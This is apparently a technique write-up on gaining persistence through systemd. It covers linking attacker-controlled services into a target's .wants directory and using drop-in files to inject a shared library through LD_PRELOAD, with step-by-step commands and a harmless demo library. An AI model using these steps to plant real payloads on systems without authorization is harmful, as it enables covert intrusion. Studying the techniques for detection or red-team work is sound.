# Systemd Autoruns

## Description

This section walks through various methods of automatically executing code,
much like Windows "Autoruns" registry entries.

## Target Wants/Requires

In systemd, targets are unit files which are "used for grouping units and as well-known synchronization points during start-up".
For systemd to know which unit files a specific target activates, it uses the `Wants` and `Requires` directives in the target's unit file,
or `<target>.wants/` and `<target>.requires/` directories with links to the units to activate.

These directories are easy places to store symbolic links to attacker-controlled unit files, especially service files which will then activate
once the specified target is executed. The following walkthrough will detail identifying the default target and placing a service file
in its `.wants/` directory to execute a command during the boot process.

**Source**: <https://www.freedesktop.org/software/systemd/man/systemd.target.html>

### Additional Notes

* Root access is required to write into the default target's `.wants/` directories
* Unit files can be anywhere on the filesystem - they only must be linked into the appropriate directory

### Step by Step

1. Generate the service file

```ini
; https://www.freedesktop.org/software/systemd/man/systemd.service.html
[Unit]
Description=Basic service
Documentation=https://github.com/infosec-intern/sneaky-systemd-shit

[Service]
Type=oneshot
ExecStart=/bin/echo "autoruns ftw"
```

2. Identify the default target

```sh
$ systemctl get-default
graphical.target
```

3. Identify the default target's `.wants/` directories

```sh
$ find / -type d -name graphical.target.wants -exec ls -ld {} \;
drwxr-xr-x 2 root root 4096 Dec 20 09:30 /etc/systemd/system/graphical.target.wants
drwxr-xr-x 2 root root 4096 Dec 20 09:11 /usr/lib/systemd/system/graphical.target.wants
```

4. Install the service (root required)

```sh
$ sudo ln -s `pwd`/autorun.service /etc/systemd/system/graphical.target.wants
$
```

5. Reboot the system to trigger the target and check the journal for output

```sh
$ journalctl -b 0 | grep -i "Starting Autorun Service" -A1
Jan 31 04:34:05 localhost systemd[1344]: Starting Autorun Service...
Jan 31 04:34:05 localhost echo[1566]: autoruns ftw
```

## Drop-Ins

Drop-ins are configuration files which extend services by adding additional directives to a unit without modifying the original service file.
For systemd to know which configuration files to include, it requires a directory of the same name as the service plus `.d` to be created.
For example, a service file `foo.service` requires a drop-in directory to be named `foo.service.d/`. This also works for unit aliases, so if
`foo.service` was also aliased as `bar.service` both `foo.service.d/` and `bar.service.d/` will be accepted as drop-in directories.

These directories are easy places to store malicious commands or environment information, like adding an `LD_PRELOAD` variable to load a malicious file into the specified process or adding additional `Exec` directives to a unit.

**Source**: <https://www.freedesktop.org/software/systemd/man/systemd.unit.html#Description>

### Additional Notes

* This appears to be the route PupyRAT takes when loading new units (seems like it targets the dbus.service unit directly)
* This particular example leverages systemd to perform code injection via LD_PRELOAD. Here are some additional sources on how LD_PRELOAD works:
  * https://jvns.ca/blog/2014/11/27/ld-preload-is-super-fun-and-easy/
  * http://www.goldsborough.me/c/low-level/kernel/2016/08/29/16-48-53-the_-ld_preload-_trick/
  * https://medium.com/forensicitguy/whitelisting-ld-preload-for-fun-and-no-profit-98dfea740b9

### Step by Step

1. Generate the service file

```ini
; https://www.freedesktop.org/software/systemd/man/systemd.service.html
[Unit]
Description=Autorun Service
Documentation=https://github.com/infosec-intern/sneaky-systemd-shit

[Service]
Type=oneshot
ExecStart=/bin/echo "autoruns ftw"
```

2. Generate a drop-in .conf file

```ini
[Service]
Environment=LD_PRELOAD=/tmp/preload.so
```

2. Generate the module to preload from the below C code

```c
#include <stdio.h>

/*
    This is NOT MY CODE
    Code borrowed from @ForensicITGuy's libpreloadvaccine project
    Source: https://github.com/ForensicITGuy/libpreloadvaccine/blob/master/test/test_data/preload.c
*/

static void init(int argc, char **argv, char **envp) {
    printf("Preload Successful!\n");
}

__attribute__((section(".init_array"), used)) static typeof(init) *init_p = init;
```

```sh
$ gcc -g fPIC -shared -o /tmp/preload.so `pwd`/preload.c
```

3. Install into the systemd user folder on the victim and reload the units

```sh
$ mkdir -p ~/.config/systemd/user/autorun.service.d
$ ln -s `pwd`/autorun.service ~/.config/systemd/user
$ ln -s `pwd`/ld_preload.conf ~/.config/systemd/user/autorun.service.d/
$ systemctl --user daemon-reload
```

5. Check the journal for output - you should see the message "Preload Successful!"

```sh
$ journalctl -b 0 | grep -i "Starting Autorun Service" -A2
Mar 20 19:38:24 localhost systemd[1772]: Starting Autorun Service...
Mar 20 19:38:24 localhost echo[3265]: Preload Successful!
Mar 20 19:38:24 localhost echo[3265]: autoruns ftw
```
